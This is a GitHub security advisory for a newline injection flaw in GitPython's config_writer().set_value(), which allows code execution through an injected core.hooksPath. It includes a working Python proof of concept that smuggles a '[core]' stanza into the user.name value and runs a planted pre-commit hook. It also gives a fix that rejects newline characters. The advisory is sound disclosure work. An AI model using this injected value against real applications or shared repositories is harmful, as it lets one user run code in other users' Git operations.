# [H] GitPython: Newline injection in config_writer().set_value() enables RCE via core.hooksPath

## Summary
Severity: High
Advisory: GHSA-v87r-6q3f-2j67
CVE: CVE-2026-44244
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-v87r-6q3f-2j67
Type: github-advisory

## Affected
- PyPI: `GitPython` — affected >=0 <3.1.49

## Details
`GitConfigParser.set_value()` passes values to Python's `configparser` without validating for newlines. GitPython's own `_write()` converts embedded newlines into indented continuation lines (e.g. `\n` becomes `\n\t`), but Git still accepts an indented `[core]` stanza as a section header — so the injected `core.hooksPath` becomes effective configuration. Any Git operation that invokes hooks (commit, merge, checkout) will then execute scripts from the attacker-controlled path.

The vulnerability is not merely malformed config output: GitPython's own writer converts embedded newlines into indented continuation lines, but Git still accepts an indented `[core]` stanza as a section header, so the injected `core.hooksPath` becomes effective configuration.

This was found while auditing MLRun's `project.push()` method, which passes `author_name` and `author_email` directly to `config_writer().set_value()` with no sanitization. Both parameters cross a trust boundary — they are caller-supplied API inputs that end up in `.git/config`.

PoC (standalone, no MLRun required):

```python
import git, subprocess, os

repo = git.Repo("/tmp/testrepo")

with repo.config_writer() as cw:
    cw.set_value("user", "name", "foo\n[core]\nhooksPath=/tmp/hooks")

r = subprocess.run(["git", "config", "core.hooksPath"], cwd="/tmp/testrepo", capture_output=True, text=True)
assert r.returncode == 0
print(r.stdout.strip())  # /tmp/hooks

os.makedirs("/tmp/hooks", exist_ok=True)
open("/tmp/hooks/pre-commit", "w").write("#!/bin/sh\nid > /tmp/pwned\n")
os.chmod("/tmp/hooks/pre-commit", 0o755)

repo.index.add(["README"])
repo.git.commit(m="test")
print(open("/tmp/pwned").read())  # uid=...
```

Tested on GitPython 3.1.46, git 2.39+.

Impact: This is persistent repo config poisoning. Any user who can supply `author_name` or `author_email` to an application calling `config_writer().set_value()` can redirect Git hook execution to an arbitrary path. In a multi-user or hosted environment (e.g. a shared MLRun server where multiple users push to the same repositories), one user can poison the `.git/config` of a shared repo and have their hooks run in the context of every subsequent Git operation by any user. On single-user deployments, the impact depends on whether the application later invokes Git hooks automatically.

Remediation: `set_value()` should raise on CR, LF, or NUL in values rather than silently pass them through:

```python
import re

if isinstance(value, (str, bytes)) and re.search(r"[\r\n\x00]", str(value)):
    raise ValueError("Git config values must not contain CR, LF, or NUL")
```

Rejecting is safer than stripping — a stripped newline might indicate the caller is passing unsanitized input at a higher level, and silent normalization masks that.

Affected wherever `config_writer().set_value(section, key, user_input)` is called with external input.** GitPython is a dependency of DVC, MLflow, Kedro, and others — worth auditing their `set_value()` call sites for externally influenced inputs.

## References
- https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v87r-6q3f-2j67
- https://nvd.nist.gov/vuln/detail/CVE-2026-44244
- https://github.com/gitpython-developers/GitPython
- https://github.com/gitpython-developers/GitPython/releases/tag/3.1.49
